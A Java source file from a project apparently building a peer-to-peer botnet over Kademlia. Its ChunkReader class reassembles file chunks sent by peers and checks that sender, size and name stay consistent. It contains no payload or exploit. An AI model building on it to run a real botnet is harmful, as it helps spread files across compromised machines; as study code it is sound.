package botnet_p2p.business_logic_layer;

import botnet_p2p.model.KademliaPeer;
import lombok.AllArgsConstructor;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.RandomAccessFile;
import java.nio.file.FileSystems;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

import static botnet_p2p.MessageOuterClass.Message;

class ChunkReader {
    private static final Logger logger = LogManager.getLogger(ChunkReader.class);
    private Map<String, ReceivedFile> receivedFiles = new HashMap<>();
    private String receivedFilesLocation;

    public ChunkReader(String receivedFilesLocation) {
        this.receivedFilesLocation = receivedFilesLocation;
    }

    @AllArgsConstructor
    class ReceivedFile {
        String fileName;
        int fileSize;
        int chunksCount;
        int chunkSize;
        int chunksRead;
        String targetFileName;
        KademliaPeer sender;
    }

    public void read(Message.FileChunkMsg fileChunk, KademliaPeer sender) {
        if (receivedFiles.containsKey(fileChunk.getUuid())) {
            handleKnownFile(fileChunk, sender);
        } else {
            handleNewFile(fileChunk, sender);
        }
    }

    private void handleNewFile(Message.FileChunkMsg fileChunk, KademliaPeer sender) {
        // ordinals: 0,1,2,..

        int chunkSize = fileChunk.getData().size();
        int chunksCount = (fileChunk.getFileSize() + chunkSize - 1) / chunkSize;
        boolean isLastChunk = (fileChunk.getOrdinal() + 1) * chunkSize >= fileChunk.getFileSize();
        String targetFileName = new String(Base64.getEncoder().encode(fileChunk.getFileName().getBytes()));
        //String targetFileName = fileChunk.getFileName()+ "." + sender.getGuid();

        ReceivedFile receivedFile = new ReceivedFile(
                fileChunk.getFileName(),
                fileChunk.getFileSize(),
                chunksCount,
                chunkSize,
                0,
                targetFileName,
                sender
        );
        receivedFiles.put(fileChunk.getUuid(), receivedFile);

        try {
            // clear file
            PrintWriter writer = new PrintWriter(receivedFilesLocation + targetFileName);
            writer.print("");
            writer.close();

            // create a file with target size
            RandomAccessFile randomAccessFile = new RandomAccessFile(
                    FileSystems.getDefault().getPath(receivedFilesLocation + targetFileName).toFile(),
                    "rw");

            byte[] b = new byte[1024];
            Arrays.fill(b, (byte) 0);
            for (int i = 0; i < fileChunk.getFileSize() / 1024; i++) {
                randomAccessFile.write(b);
            }

            // write remaining bytes
            randomAccessFile.write(b, 0,
                    fileChunk.getFileSize() - (fileChunk.getFileSize() / 1024) * 1024);


            // save current chunk
            long position = fileChunk.getOrdinal() * chunkSize;
            randomAccessFile.seek(position);
            if (isLastChunk) {
                int bytesInLastChunk =
                        chunkSize - (chunksCount * fileChunk.getData().size() - fileChunk.getFileSize());
                randomAccessFile.write(fileChunk.getData().toByteArray(), 0, bytesInLastChunk);
            } else {
                randomAccessFile.write(fileChunk.getData().toByteArray());
            }

            receivedFile.chunksRead++;
            randomAccessFile.close();

            if (receivedFile.chunksRead == chunksCount) {
                logger.info("file: " + receivedFile.fileName + " is ready as "+ receivedFile.targetFileName);
                receivedFiles.remove(fileChunk.getUuid());
            }
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    private void handleKnownFile(Message.FileChunkMsg fileChunk, KademliaPeer sender) {
        // ordinals: 0,1,2,..

        ReceivedFile receivedFile = receivedFiles.get(fileChunk.getUuid());
        if (!receivedFile.sender.equals(sender)) {
            logger.error("file sender has changed");
            receivedFiles.remove(fileChunk.getUuid());
            return;
        }
        if (receivedFile.chunkSize != fileChunk.getData().size()) {
            logger.error("chunk size has changed");
            receivedFiles.remove(fileChunk.getUuid());
            return;
        }
        if (!receivedFile.fileName.equals(fileChunk.getFileName())) {
            logger.error("filename has changed");
            receivedFiles.remove(fileChunk.getUuid());
            return;
        }
        if (receivedFile.fileSize != fileChunk.getFileSize()) {
            logger.error("filesize has changed");
            receivedFiles.remove(fileChunk.getUuid());
            return;
        }

        boolean isLastChunk = (fileChunk.getOrdinal() + 1) * receivedFile.chunkSize >= fileChunk.getFileSize();


        try {
            // open a file with target size
            RandomAccessFile randomAccessFile = new RandomAccessFile(
                    FileSystems.getDefault().getPath(receivedFilesLocation + receivedFile.targetFileName).toFile(),
                    "rw");

            // save current chunk
            long position = fileChunk.getOrdinal() * receivedFile.chunkSize;
            randomAccessFile.seek(position);
            if (isLastChunk) {
                int bytesInLastChunk =
                        receivedFile.chunkSize - (receivedFile.chunksCount * fileChunk.getData().size() - fileChunk.getFileSize());
                randomAccessFile.write(fileChunk.getData().toByteArray(), 0, bytesInLastChunk);
            } else {
                randomAccessFile.write(fileChunk.getData().toByteArray());
            }

            receivedFile.chunksRead++;
            randomAccessFile.close();

            if (receivedFile.chunksRead == receivedFile.chunksCount) {
                logger.info("file: " + receivedFile.fileName + " is ready as "+ receivedFile.targetFileName);
                receivedFiles.remove(fileChunk.getUuid());
            }
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }


    }
}
